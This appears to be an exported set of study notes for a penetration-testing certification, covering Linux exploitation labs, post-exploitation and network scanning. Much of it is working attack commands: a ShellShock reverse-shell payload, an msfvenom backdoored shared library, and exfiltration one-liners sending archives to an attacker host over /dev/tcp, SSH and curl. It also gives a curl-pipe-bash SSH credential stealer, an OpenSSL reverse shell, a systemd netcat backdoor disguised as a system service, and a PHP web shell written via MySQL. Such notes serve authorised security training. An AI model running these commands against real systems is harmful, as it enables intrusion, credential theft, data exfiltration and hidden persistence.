impacket-smbclient &lt;IP_Address&gt;              # Interacting with share\n\n$ mkdir -p /tmp/share\n$ mount -t cifs \\\\\\\\$IP\\\\Share /tmp/share      # Mount share on /tmp/share\n\n\n\n# Enumerating SMB Users - enum4linux\n$ enum4linux &lt;IP_Address&gt;\n\n# Enumerating SMB Users - rpcclient\n$ rpcclient -U \"\" -N &lt;Target&gt;\n&gt; emumdomusers\n&gt; enumdomgroups\n&gt; enumdomains\n&gt; queryuser &lt;user&gt;\n\n\n\n# Enumerating SMTP Users\n$ nmap --script smtp-* &lt;IP_Address&gt; -p25 \n$ nc &lt;IP_Address&gt; 25\n$ telnet &lt;IP_Address&gt; 25\n\ntelnet &gt; HELO domain.com                         # Start Communication\n\ntelnet &gt; MAIL FROM: user@domain.com\ntelnet &gt; RCPT TO: root@domain.com                # Query if user exist\n\ntelnet &gt; EXPN root                               # Query if user exist\n\ntelnet &gt; VRFY root                               # Query if user exist\n\n\n$ smtp-user-enum -M VRFY -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M EXPN -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M RCPT -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M VRFY -u root -t &lt;IP_Address&gt; \n\n\n\nReference :\n# User List\nhttps://github.com/insidetrust/statistically-likely-usernames\n</code></pre></p> <p>Enumerate users with rpcclient <pre><code>for u in `cat users.txt`;\n    do rpcclient -U \"\" -N &lt;IP_Address&gt; \\\n    --command=\"lookupnames $u\";\ndone | grep \"User: 1\"\n</code></pre></p> <p>Local Enumeration <pre><code># Network Information\n\n$ ifconfig -a                                    # Network Information\n$ route -n                                       # Network Routes\n$ traceroute -n &lt;IP_Adderss&gt;                     # Hops count\n$ cat /etc/resolv.conf                           # DNS Information\n$ arp -a                                         # ARP Cache\n$ netstat -auntp                                 # List TCP/UDP Connections\n$ ss -twurp                                      # Active Network Connections\n$ nmap -sT -p4444-4450 portquiz.net              # OutBound port Connectivity\n\n\n\n# System Information\n\n$ id                                # Current User Information\n$ uname -a                          # Kernel Version\n$ grep $USER /etc/passwd            # Current User Info From /etc/passwd\n$ lastlog                           # Most Recent Logins\n$ w                                 # Who is Currently Logged onto System\n$ last                              # Last Logged On Users\n$ cat /etc/shadow                   # Check Readability of the shadow file\n$ sudo -l                           # Check sudo without Password\n$ cat /etc/sudoers                  # Check Readability of the sudoers file\n$ cat /root/.bash_history           # Check Readability of the history file\n$ cat /etc/issue                    # Operating System\n$ cat /etc/*-release                # Operating System\n$ ls -als /root/                    # Check Availability to Read root DIR\n$ echo $PATH                        # Current $PATH environment variable\n$ cat /etc/contab                   # List All Cron Jobs\n$ ls -als /etc/cron*                # List All Cron Jobs\n$ find /etc/cron* -type f -perm -o+w -exec ls -l {} \\;   # Writable Cron Jobs\n$ ps auxwww                         # List Running Processes\n$ ps -u root                        # List All Processes Running Under root\n$ ps -u $USER                       # Processes Running as Current User\n$ find / -perm -4000  2&gt;/dev/null    # Find SUID files\n$ find / -uid 0 -perm -4000 -type -f 2&gt;/dev/null   # Suid Files Owned by root\n$ find / -perm -2000 -type -f 2&gt;/dev/null    # Find GUID files\n$ find -perm -2 -type f 2&gt;/dev/null          # Find Writable files\n$ grep pass* /etc/*.conf                     # Conf files that contain pass\n$ lsof -n                                    # List open files\n$ dpkg -l                                    # List Installed Packages\n$ sudo -V                                    # Commond Software Versions\n$ httpd -v                                   # Commond Software Versions\n$ apache2 -v                                 # Commond Software Versions\n$ mysql -V                                   # Commond Software Versions\n$ sendmail -d0.1                             # Commond Software Versions\n$ ps aux | awk `print( $11}` | xargs -r ls -la 2&gt;/devnull | awk `!x[$0]++`  # Print Process Binaries/Path and Permissions\n\n\n\n\nReference: \nhttps://staaldraad.github.io/2017/12/20/netstat-without-netstat/\nhttp://portquiz.net/\n</code></pre></p> <p>Lab 1 - Remote Enumeration <pre><code># demo.ine.local - 25/tcp open smtp\n$ nmap --script smtp-enum-users -p 25 demo.ine.local\n$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t demo.ine.local\n\n\n# demo2.ine.local - 139/tcp open netbios-ssn, 445/tcp open microsoft-ds\n$ enum4linux demo2.ine.local\n$ rpcclient -U \"\" -N demo2.ine.local\n$ hydra\n\n\n# demo3.ine.local - 79/tcp open finger\n$ finger root@demo3.ine.local\n$ for i in `cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt`; do finger $i@demo3.ine.local; done | grep Login:\n\n\n# demo4.ine.local - 21/tcp open ftp\n$ nmap -sS -sV --script vuln demo4.ine.local\nmsf &gt; use exploit/unix/ftp/proftpd_133c_backdoor\n</code></pre></p> <p>Lab 2 - Local Enumeration <pre><code># Privilege Escalation - SUID. - /usr/bin/find\n\n$ find / -perm -4000 2&gt;/dev/null                  # Find Writable SUIDs\n$ find . -exec /bin/sh \\; -quit\n\n\n# Privilege Escalation - sudo -l\n$ sudo -l\n$ sudo /etc/init.d/cron \n$ sudo /etc/init.d/cron status   \n$ find / -name message                # Find message file\n$ grep -nri \"/tmp/message\" /usr       # Find jobs which affected /tmp/message\n\n$ printf '#! /bin/bash\\necho \"student ALL=NOPASSWD:ALL\" &gt;&gt; /etc/sudoers\\n' &gt; /usr/local/share/copy.sh\n\n$ echo \"student  ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/student \n\n\n# Run LinEnum\n$ ./opt/LinEnum/LinEnum.sh\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#exploitation-over-the-network","title":"Exploitation over the Network","text":"<p>Password Spray <pre><code>$ hydra -L users.txt -P password.txt ssh://$IP\n\n$ hydra -l admin -p Spring2023 -M ssh_servers.txt ssh\n\n# Outlook Brute Force\nhttps://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/\n\n# Tool\nhttps://github.com/dafthack/DomainPasswordSpray/tree/master\n\n\n# Common Passwords\nSeason-Year\nSpring2023\n\nCorpName-Number\nFooCorp01\nFooCorp02\n</code></pre></p> <p>Exploiting Samba <pre><code># Samba Version Discovery\n$ nmap --script smb-os-discovery -p445 &lt;Target_IP&gt;\n\n\n# Idenfity Vulnerabilities affected on Samba Version\n$ searchsploit samba 3.0.20\n\n\n\n# Exploit CVE-2007-2447 - Samba 3.0.20\nmsf &gt; use exploit/multi/samba/usermap_script\n\n# PTY Shell\n$ python -c \"import pty;pty.spawn('/bin/sh')\"\n\n\n\n# Exploit Samba Symlink Directory Traversal Vulnerability\n$ smbmap -H &lt;IP_Address&gt;       # Search Writeable Share\nmsf &gt; use auxiliary/admin/smb/samba_symlink_traversal\n\n$ smbclient \\\\\\\\$IP\\\\$Share -N     # SMB Shell\nsmb:\\&gt; tar c /tmp/all_files.tar    # Make Archieve \n\n$ tar -xf all_files.tar            # Extract Archieve\n$ grep -r \"password\" * 2&gt;/&amp;1  /dev/null  # Search Sensitive Keywords\n\n\n\n\n# Writable Samba Server RCE via Perl - Full Patched\n# Perl WebShell, upload to \"www\" share where HTTP server files are.\n$ /usr/share/webshells/perl/\n$ nc -nlvp &lt;PORT&gt;\n</code></pre></p> <p>Exploiting ShellShock <pre><code># https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6271\n\n# Test on Local System if target is vulnerable\n$ env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\"\n\n----------------------------------------------------------------------\n\n# CGI Exploit - ShellShock\n\n# Find CGI files on cgi-bin Directory\n.\\dirsearch.py -u &lt;Target&gt; -e cgi -r \n\n# Nmap script to check if target is vulnerable\n$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi  &lt;target&gt;\n\n# Nmap script to Execute Commands on target\n$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi,cmd=ls &lt;target&gt;\n\n# Wget script to Execute Commands on target\n$ nc -nlvp &lt;Port&gt;\n$ wget -U \"() { foo;};echo; /bin/nc &lt;Attacker_IP&gt; &lt;Port&gt; -e /bin/sh\" http://&lt;Target_IP&gt;/cgi-bin/login.cgi \n</code></pre></p> <p>Exploiting Heartbleed <pre><code># Check if Target is VUlnerable\n$ nmap --script ssl-heartbleed &lt;target&gt;\n\n# Exploit Heartbleed\nmsf &gt; use auxiliary/scanner/ssl/openssl_heartbleed\nmsf &gt; show actions\nmsf &gt; SET action DUMP\nmsf &gt; exploit\n\n\nNOTE : If sensitive data does not leaked, run few more times. Different contents will appear at different time \n</code></pre></p> <p>Exploiting Java RMI Registry <pre><code># Port Check\n$nmap -sT -sV &lt;Target&gt; -p1099\n\n\n# Exploit \nmsf &gt; use exploit/multi/misc/java_rmi_server\n\n\n\n\nNOTE : Many IDS flag metasploit SSL certificates so use custom SSL certificate.\n\nNOTE : Port may be different.\n</code></pre></p> <p>Exploiting Java Deserialization <pre><code># https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\n</code></pre></p> <p>Exploiting Tomcat <pre><code># Login Brute Force\nmsf &gt; use auxiliary/scanner/http/tomcat_mgr_login\n\n# Laudanum - Malicious war file.\n$ /usr/share/laudanum/jsp/cmd.war\n\nHTTP &gt; http://&lt;IP_Address&gt;/cmd/cmd.jsp  \n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#post-exploitation","title":"Post Exploitation","text":""},{"location":"eCPPT%20Materials/Linux%20Exploitation/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code># Netcat File Transfer\n$ nc -l -p 1234 &gt; Linenum.sh             # Victim \n$ nc -w 3 &lt;Target_IP&gt; 1234 &lt; Linenum.sh  # Attacker\n</code></pre> <p>Cleartext Credentials in Confuguration FIles <pre><code># Linenum\n$ chmod +X Linenum.sh\n$ ./Linenum.sh\n\n$ ./Linenum.sh -k {Keyword}\n\n----------------------------------------------------------------------\n\n# Search \"Password\" Keyword on .conf files\n$ grep -r password /etc/*.conf 2&gt;/dev/null\n\n\n----------------------------------------------------------------------\n# Metasploit Modules\nmsf &gt; use post/linux/gather/enum_configs\nmsf &gt; use post/linux/gather/enum_system\nmsf &gt; use post/linux [TAB]\n</code></pre></p> <p>SUID Binaries <pre><code># Search For All SUID Executables\n$ find / -perm -4000 -type f 2&gt;/dev/null\n\n----------------------------------------------------------------------\n\n\n# glibc $ORIGIN Expansion Privilege Escalation\nmsf &gt; use exploit/linux/local/glibc_origin_expansion_priv_esc\n</code></pre></p> <p>Sudo Privileged Access <pre><code># Exploits\nhttps://gtfobins.github.io/\n\n\n\n# Sudoers file\n/etc/sudoers\n\n\n# Sudo Commands\n$ Sudo -l\n\n\n# Sudo - Docker Command Privilege Escalation\nhttps://github.com/pyperanger/dockerevil\n</code></pre></p> <p>Restricted Shells <pre><code># Check Restricted Shell on System\n$ $ENV\n\n----------------------------------------------------------------------\n\n# Restricted Shell Escape With Vi/VIM\n$ vim /tmp/test\n&gt; :!sh\n\n----------------------------------------------------------------------\n\n\n# Restricted Shell Escape With Find\n$ find /home/bob -name test -exec /bin/sh \\;\n\n----------------------------------------------------------------------\n\n\n# Restricted Shell Escape With Python/Perl\n$ python -c 'import pty; pty.spawn(\"/bin/sh\")'     # Python\n$ perl -e 'exec \"/bin/sh\";'                        # Perl\n\n----------------------------------------------------------------------\n\n# Restricted Shell Escape With SSH\n$ ssh restricted_user@targerserver -t \"/bin/sh\"\n</code></pre></p> <p>Cracking The Shadow <pre><code># Unshudow Command\n$ unshudow /etc/passwd /etc/shadow &gt; shadow.john\n\n# Crack with John\n$ john shadow.john --wordlist=rockyou.txt \n\n----------------------------------------------------------------------\n\n# Dump Passwords From Memory - Mimipenguin\n$ ./mimipenguin.sh\n$ ./mimipenguin.py\n</code></pre></p> <p>Pilfering Credentials From Swap Memory <pre><code># Check Swap Partition \n$ swapon -s\n$ cat /proc/swaps\n\n\n# Dump Sensitive Info From Swap Partition \n$ strings /dev/sda5 | grep \"password\"\n\n\n# Automation\nhttps://github.com/sevagas/swap_digger\n</code></pre></p> <p>Code Execution via Shared Object Library Loading <pre><code>1. Determine the shared object that are being loaded by an executable\n2. Determine if the application was compiled with RPATH or RUNPATH options. If Yes, can we write into the locations specified by the either of those options ?\n\n\n# Determine the shared object that are being loaded by an executable\n$ ldd &lt;Executable_Program&gt;\n\n$ ldd /usr/local/bin/program\noutput &gt; program.so =&gt; /usr/lib/program/program.so\n\n# Determine if the Executable was Compiled with RPATH or RUNPATH\n$ objdump -x /usr/local/bin/program | grep RPATH\n$ objdump -x /usr/local/bin/program | grep RUNPATH\noutput &gt; RPATH   /tmp/program/libs         # Writable Directory\n\n\n# Generate Backdoored Shared Object\n$ msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;Attacker_IP&gt; LPORT=&lt;Attacker_PORT&gt; -f elf-so -o program.so\n\n# Metasploit Listener\nmsf &gt; use exploit/multi/handler\nmsf &gt; set payload linux/x64/shell_reverse_tcp\nmsf &gt; exploit\n\n# Transfer Backdoored Shared Object to the Target Machine\n$ python3 -m http.server                                   # Attacker\n$ cd /tmp/program/libs &amp;&amp; wget [Attacker_IP]/program.so    # Victim\n</code></pre></p> <p>Kernel Exploits <pre><code># Search Debian Based Linux Kernel Exploits\n$ searchsploit \"linux kernel debian\"\n\n\n# Finding the Right Kernel Exploit\n$ perl Linux_Exploit_Suggester.pl\n$ perl Linux_Exploit_Suggester.pl &lt;Kernel_Version&gt;\n\n\n# Compiling Exploit Code\n$ gcc exploit.c -o exploit\n$ chmod +x exploit\n$ ./exploit\n\n# Compile as 32 Bit\n$ gcc -m32 exploit.c -o exploit\n\n\nReference:\nhttps://github.com/InteliSecureLabs/Linux_Exploit_Suggester\n\nhttps://github.com/lucyoa/kernel-exploits\nhttps://github.com/SecWiki/linux-kernel-exploits\n</code></pre></p> <p>Socket Exploitation <pre><code># Privilege Esclataion With User Which is in Docker Group\n$ docker run -v /etc/shadow:/docker/hashedpasswords -d postgres\n$ docker exec -ti [CONTAINER_ID] bash\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#lateral-movement","title":"Lateral Movement","text":"<p>SSH Hijacking <pre><code># Determine the SSH process ID\n$ ps aux | grep sshd\n\n# Find the SSH_AUTH_SOCK environment variable for the sshd\n$ grep SSH_AUTH_SOCK /proc//environ\n\n# Hijack the ssh-agent socket\n$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add \u2013l\n\n# Log into the remote system our victim is logged into\n$ ssh remotesystem -l victim\n\n\nNOTE : In order for this method to be succesful, the compromised machine should have an anctive SSH session estabilished to another machine via Public Key Authentication\n\nReference: \nhttps://kwcsec.gitbook.io/the-red-team-handbook/techniques/lateral-movement/linux/ssh-hijacking\n</code></pre></p> <p>Stealing SSH Credentials <pre><code># https://github.com/mthbernardes/sshLooter\n\n\n$ git clone https://github.com/mthbernardes/sshLooter.git  # Attacker\n$ curl http://yourserverip:8000/install.sh | bash          # Victim\n\n\nReferenfe :\nhttps://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==\n</code></pre></p> <p>Samba Secrets <pre><code># Samba 4.7.4 - secrets.tdb dump\n$ tdbdump /var/lib/samba/private/secrets.tdb\n\n\n\nReference :\nhttps://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9\n</code></pre></p> <p>VPN Pivot <pre><code># https://github.com/0x36/VPNPivot\n\nroot@pwnies:~# git clone https://github.com/0x36/VPNPivot.git\nroot@pwnies:~# cd VPNPivot\nroot@pwnies:~/VPNPivot# ./autogen.sh\nroot@pwnies:~/VPNPivot# ./configure\nroot@pwnies:~/VPNPivot# make &amp;&amp; make install\nroot@pwnies:~/VPNPivot# ./src/pivots -h\n\n\nReference :\nhttps://www.youtube.com/watch?v=VauxUK3OZnQ\n</code></pre></p> <p>Dumping Stored Firefox Credentials <pre><code># https://github.com/unode/firefox_decrypt/tree/main\n\n$ python firefox_decrypt.py\n</code></pre></p> <p>**Dump sshd and sudo Credential Related Strings ** <pre><code># https://github.com/blendin/3snake\n\n$ git clone https://github.com/blendin/3snake.git\n$ make\n$ ./3snake -h\n$ ./3snake\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code># Exfil over TCP Socket with EBCDIC and Base64\n\n# Step 1 - Netcat Listener on Attacker Machine\n$ nc nlvp 80 &gt; datafolder.tmp                    \n\n# Step 2 - Encode Data with Base64/EBCDIC on Victim And Sen Over TCP\n$ tar zcf - /tmp/datatolder | base64 | dd conv=ebcdic &gt; /dev/tcp/&lt;attacker_IP&gt;/80        \n\n# Step 3 - Decode Recieved File on Attacker Machine\n$ dd conv=ascii if=datafolder.tmp | base64 -d &gt; datafolder.tar\n\n# Step 4 - Extract Tar Archieve\n$ tar xvf datafolder.tar\n\n\n\n----------------------------------------------------------------------\n\n\n# Exfil over SSH\n\n# Step 1 - Send Data over SSH\n$ tar -zcf - /tmp/datafolder | ssh root@&lt;attacker_IP&gt; \"cd /tmp; tar zxpf -\"\n\n# Step 2 - On Attacker Host Data is Already untar'd\n\n\nNOTE : For extra stealthiness, configure SSH server on port 80 for instance\n\n\n----------------------------------------------------------------------\n\n# Exfil via POST Request over HTTPS\n\n# Step 1 - On attacker Server, Create PHP File That Recieve Data\n&lt;?php file_put_contents('/tmo/datafolder.base64', file_get_contents('php://input')); ?&gt;\n\n# Step 2 - Send Data over HTTPS via Curl\n$ curl --data \"$(tar zcf - /tmp/datafolder | base64)\" https://&lt;attacker_IP&gt;/contanct.php\n\n# Step 3 - Decode Recieved File on Attacker Machine\n$ cat /tmo/datafolder.base64 | base64 -d &gt; datafolder.tar &amp;&amp; tar xf datafolder.tar\n\n\n----------------------------------------------------------------------\n\n\nReference : \nhttps://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/\n</code></pre>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#maintaining-access","title":"Maintaining Access","text":"<p>OpenSSL Reverse Shell <pre><code># Generate SSL Certificate Key Pair\n$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n# Start OpenSSL Listener with Generated SSL Kay Pair\n$ openssl s_server -quit -key key.pem -cert cert.pem -port 443\n\n# mkfifo named pipe Reverse Shell - Victim Machine\n$ mkfifo /tmp/x; /bin/sh -i &lt; /tmp/x 2&gt;&amp;1 | openssl s_client -quit -connect &lt;attacker_IP&gt;:443 &gt; /tmp/x; rm /tmp/x\n</code></pre></p> <p>ICMP Reverse Shell <pre><code># https://github.com/bdamele/icmpsh\n\n# https://book.hacktricks.xyz/c2/icmpsh\n</code></pre></p> <p>Backdoors <pre><code># Xinetd UDP Portknock Backdoor\n\n# Create Custom xinetd Service on Victim Machine. Run Following Script\n&gt;  https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56\n\n# Start Netcat Listener on Attacker Machine\n$ nc -nlvp 4444\n\n# Send Single UDP packet on xinetd Service to Get Reverse Shell\n$ hping3 -2 -c 1 &lt;target IP&gt; -p 65534\n\n\n----------------------------------------------------------------------\n\n# Systemd Netcat Bind Shell\n\n# Step 1 - Copy nc Executable to /lib/systemd Directory\n$ cp /bin/nc /lib/systemd/systemd-service\n\n# Step 2 - Create File /lib/systemd/system/systemd.service With Following Content\n[Unit]\nDescription = Systemd Service\nAfter = network.target\n[Service]\nExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh\n[install]\nWantedBy = multi-user.target\n\n\n# Step 3 - Enable Systemd Netcat Bind Shell Service\n$ systemctl enable systemd.service\n$ systemctl start systemd.service\n\n\n# Step 4 - Confirm that Port for Custom Service is Listening\n$ netstat -auntp | grep 56825\n\n\n# Step 5 - Initiate Connection and Get Reverse Shell\n$ nc &lt;target_IP&gt; 56825\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#labs","title":"Labs","text":"<p>Linux Exploitation: Lab 3 - Remote Exploitation and Post Exploitation <pre><code># Exploit demo.ine.local - Port 80 egallery\n$ searchsploit EGallery\nmsf &gt; use exploit/unix/webapp/egallery_upload_exec\nmsf &gt; set targeturi /\nmsf &gt; exploit\n\n\n# demo.ine.local - Privilege Escalation - Exim smtpd 4.89\nmsf &gt; use exploit/linux/local/exim4_deliver_message_priv_esc\nmsf &gt; set payload linux/x86/meterpreter/reverse_tcp\nmsf &gt; exploit\n\n\n# Pivoting\nmeterpreter &gt; run autoroute -s 192.161.244.0/24\nmeterpreter &gt; background\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; exploit\nmsf &gt; jobs\n\n\n# Port Scan on Pivoting Network\n$ proxychains nmap -sT -Pn -n 192.161.244.3-5 --top-ports 50\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n\n\n# Scan Pivoted Machine (192.161.244.3) for ShellShock - cgi-bin/stats\n$ proxychains nmap sT -Pn -n -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/stats 192.161.244.3\n\n\n# Exploit Port 80 on Pivoted Machine - cgi-bin shellshock\nmsf &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec\nmsf &gt; set targeturi /cgi-bin/stat\nmsf &gt; set PAYLOAD linux/x86/meterpreter/bind_tcp\nmsf &gt; exploit\n</code></pre></p> <p>Linux Exploitation: Lab 4 - Lateral Movement <pre><code># Nmap Scan - Port 79 - demo.ine.local\n$ nmap -sS -sV demo.ine.local\n\n\n# Enumerate Users with Port 79 ( Finger )\n$ for i in `cat /usr/share/metasploit-framework/data/wordlists/common_users.txt`; do finger $i@demo.ine.local; done | grep Login:\n\n\n# Brute Force Enumerated User Through SSH\n$ hydra -l sysadmin -p /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt demo.ine.local ssh\n\n\n# Login with SSH, Enumerate Local Ports and Forward Them\n$ ssh sysadmin@demo.ine.local\n$ netstat -auntp\n$ ssh -L 3306:127.0.0.1:3306 sysadmin@demo.ine.local\n\n\n# Brute Force Forwarded MySQL Port\nmsf &gt; auxiliary/scanner/mysql/mysql_login\nmsf &gt; set RHOST 127.0.0.1\nmsf &gt; set PASS_FILE /usr/share/metasploit-framework/data/wordlist/unix_password.txt\nmsf &gt; set USERNAME root\nmsf &gt; run\n\n\n# Privilege Escalation - Enumerate Local MySQL port - Library is running with root privileges\n$ ps aux | grep mysql\nmsf &gt; use exploit/multi/mysql/mysql_udf_payload\nmsf &gt; set RHOST 127.0.0.1\nmsf &gt; set TARGET Linux\nmsf &gt; exploit\n\n\n# Enumerate .bash_history file on users home folder - mysql Credentials on 192.3.178.3 \n$ cat /home/auditor/.bash-history\n\n\n# Pivoting\nmeterpreter &gt; run autoroute -s 192.3.178.0/24\nmeterpreter &gt; background\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; exploit\nmsf &gt; jobs\n\n\n# Port Scan on Pivoting Network\n$ proxychains nmap -sT -Pn -n 192.3.178.1-5 --top-ports 50\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n\n\n# Scan Pivoted Machine 192.161.244.3 and Forward Ports on Local Machine\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n$ ssh -L 3306:192.161.244.3:3306 -L 80:192.161.244.3:80 sysadmin@demo.ine.local\n\n\n# Enumerate port 80 - WebTemp Directory is found\n$ Dirsearch -u http://127.0.0.1\n\n\n# Upload file to WebTemp Directory Through MySQL\n$ mysql -h 192.161.224.3 -u root -p{Password Found on .bash_history file}\nmysql &gt; select 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE '/var/www/html/webtemp/exploit.php'\n\n\n# Get FLAG with Reverse Shell\n$ curl http://127.0.0.1/webtemp/exploit.php?cmd=id\n$ curl http://127.0.0.1/webtemp/exploit.php?cmd=cat ../FLAG2\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/","title":"Network Security","text":""},{"location":"eCPPT%20Materials/Network%20Security/#information-gathering","title":"Information Gathering","text":""},{"location":"eCPPT%20Materials/Network%20Security/#search-engines","title":"Search Engines","text":"<p>Google Dork : <pre><code>site:[website] filetype:[filetype]\n</code></pre></p> <pre><code>cache:[URL]\n</code></pre> <p>theHarvester : <pre><code>theharvester -d  domain.com -l 100 -b google\n</code></pre> - -d is the domain - -l limits the results to the value specified - -b data source</p> <p>Interesting Tools : - DNSdumpster - Shodan - Exploits Shodan - FOCA - Maltego</p>"},{"location":"eCPPT%20Materials/Network%20Security/#dns-enumeration","title":"DNS Enumeration","text":"<p>Whois : <pre><code>whois domain.com\n</code></pre></p> <p>IP Resolve : <pre><code>dig domain.com\n</code></pre> <pre><code>nslookup domain.com\n</code></pre></p> <p>Nameserver lookup : <pre><code>dig domain.com NS\n</code></pre> <pre><code>nslookup -type=NS domain.com\n</code></pre></p> <p>Reverse DNS lookup : <pre><code>dig domain.com PTR\ndig axfr -x 192.168 @DNS_IP \n</code></pre> <pre><code>nslookup -type=PTR domain.com\n</code></pre></p> <p>Mail Exchange lookup : <pre><code>dig domain.com MX\n</code></pre> <pre><code>nslookup -type=MX domain.com\n</code></pre></p> <p>Zone transfers : <pre><code>dig axfr @DNS_IP domain.com +nocookie\n</code></pre> <pre><code>nslookup\n&gt; server [nameserver for domain.com]\n&gt; 1s -d domain.com\n</code></pre></p> <p>DNS Tools : <pre><code>fierce --domain domain.com \n</code></pre> <pre><code>fierce --domain domain.com --dns-servers {IP}\n</code></pre></p> <p><pre><code>dnsenum domain.com\n</code></pre> <pre><code>dnsenum domain.com --dnsserver {DNS IP}\n</code></pre> <pre><code>dnsenum domain.com -f {subdomain file}\n</code></pre></p> <p><pre><code>dnsmap domain.com\n</code></pre> <pre><code>dnsmap domain.com -w {subdomain file}\n</code></pre></p> <p><pre><code>dnsrecon -d domain.com\n</code></pre> <pre><code>dnsrecon -d domain.com -n {NS IP}\n</code></pre> <pre><code>dnsrecon -d domain.com -{scan option}\n</code></pre></p> <p>Labs <pre><code># Scan - Check opened DNS port\n$ nmap -sS -p53 witrap.com\n\n\n# How many A Records are present for witrap.com and its subdomains?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# What is the machine's IP address that supports LDAP over TCP on witrap.com ?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# Can you find the secret flag in the TXT record of a subdomain of witrap.com?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# What is the subdomain for which only reverse dns entry exists for witrap.com? witrap owns the IP address range: 192.168..\n$ dig axfr -x 192.168 @192.199.31.3\n\n\n# How many records are present in the reverse zone for witrap.com (excluding SOA)? witrap owns the IP address range: 192.168..\n$ dig axfr -x 192.168 @192.199.31.3\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#scanning","title":"Scanning","text":""},{"location":"eCPPT%20Materials/Network%20Security/#host-discovery","title":"Host discovery","text":"<p><pre><code>fping -asgq 192.168.1.0/24\n</code></pre> <pre><code>nmap -sn 192.168.1.0/24\n</code></pre> <pre><code>hping3 -1 192.168.1.x --rand-dest -I eth0\n</code></pre></p> <p><pre><code>nmap -sS -p53 [NETBLOCK]\n</code></pre> <pre><code>nmap -sU -p53 [NETBLOCK]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#scanning-techniques","title":"Scanning techniques","text":"<pre><code>nmap -sS target                         # SYN scan\nnmap -sA target                         # ACK scan\nnmap -sF target                         # FIN scan\nnmap -sN target                         # Null scan\nnmap -sO target                         # IP Protocol scan\nnmap -sX target                         # XMAS scan\n\nhping3 -S target -c 1                         # SYN scan\nhping3 -A target -c 1                         # ACK scan\nhping3 -F target -c 1                         # FIN scan\nhping3 -F -P -U target -c 1                   # XMAS scan\n</code></pre> <p>Idle/Zombie scan <pre><code>nmap -O -v -n targetZombie\nnmap --script ipidsec targetZombie\nnmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v\n</code></pre></p> <pre><code>hping3 -S -r -p [port] [targetZombie]\nhping3 -a [targetZombie] -S -p [port] [target]\n</code></pre> <p>FTP bounce scan : <pre><code>nmap -Pn -b [ftpvulnerable] [target]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#service-and-os-detection","title":"Service and OS detection","text":"<pre><code>nc [targetIP]:[Port]                      # Banner Grabbing\nnmap -sV target                           # Version Scan\nnmap -sV -sC target                       # Version/Script Scan\nnmap -O target                            # OS Detection\nnmap -A target                            # Version/Script/OS/Traceroute Scan\n</code></pre> <pre><code>./p0f -i [interface]\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#firewallids-evasion","title":"Firewall/IDS Evasion","text":"<p>Fragmentation  <pre><code>nmap -sS -f [target]\nnmap -sS -f --data-lenght 100 [target]\n</code></pre></p> <p>Decoy  <pre><code>nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]\nnmap -sS -D RND:10 [target]\n</code></pre></p> <p>Source ports <pre><code>nmap -sS --source-port [source port] [target]\nhping3 -S -s [source port] [target]\n</code></pre></p> <p>Packet header  <pre><code>nmap -sS --data-lenght 10 [target]\nhping3 -S --data 24 [target] -p [port]\n</code></pre></p> <p>Mac address spoofing <pre><code>nmap -sS --spoof-mac [mac] [target]\n</code></pre></p> <p>Timing <pre><code>nmap -iL [hosts.txt] -sS -T [Timing option]\n\n0 - 5 min\n1 - 15 sec\n2 - 0.4 sec\n3 - default\n4 - 1 msec\n5 - 5 msec\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#enumeration","title":"Enumeration","text":""},{"location":"eCPPT%20Materials/Network%20Security/#netbios","title":"NetBIOS","text":"<p>NetBIOS enumeration from Windows <pre><code>nbtstat -n                                 #NetBIOS names on our 